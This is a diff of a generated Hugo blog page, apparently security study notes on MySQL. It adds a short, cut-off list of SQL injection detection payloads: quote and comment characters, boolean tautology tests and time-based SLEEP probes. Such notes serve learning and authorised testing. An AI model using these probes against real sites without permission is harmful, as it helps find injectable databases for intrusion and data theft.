@@ -30,7 +30,7 @@ https://github.com/alex-shpak/hugo-book
 
 
   <script defer src="/fuse.min.js"></script>
-  <script defer src="/zh.search.min.94bc7878523bb2a49b204951b2484e38046b2b2c4491852ce3768fe44a39463a.js" integrity="sha256-lLx4eFI7sqSbIElRskhOOARrKyxEkYUs43aP5Eo5Rjo=" crossorigin="anonymous"></script>
+  <script defer src="/zh.search.min.8a372902eee07c4f1cac9a6fe247d9885bca9f3446f8f93bb603b4a5b0bb11b7.js" integrity="sha256-ijcpAu7gfE8crJpv4kfZiFvKnzRG&#43;Pk7tgO0pbC7Ebc=" crossorigin="anonymous"></script>
 
 
 <link rel="alternate" type="application/rss+xml" href="https://Fivesix567.github.io/posts/WebSec/SQL/MySQL/index.xml" title="Fivesix's blog" />
@@ -357,8 +357,25 @@ https://github.com/alex-shpak/hugo-book
 
 
         <div class="book-post-content markdown-inner"><!-- 在这里开始写你的文章... -->
-<p><img src="./index.assets/image-20260129211509222.png" alt="image-20260129211509222"  />
-</p></div>
+<p>检测payload</p>
+<pre tabindex="0"><code>&#39;
+&#34;
+`
+&#39;)
+&#34;)
+;
+--
+#
+AND 1=1
+AND 1=2
+&#39; AND &#39;1&#39;=&#39;1
+&#39; AND &#39;1&#39;=&#39;2
+&#34; AND &#34;1&#34;=&#34;1
+&#34; AND &#34;1&#34;=&#34;2
+&#39;) AND (&#39;1&#39;=&#39;1
+&#39; AND SLEEP(5)--+
+&#34; AND SLEEP(5)--+
+AND …</code></pre></!--></div>
       </div></div>
   </article>
   
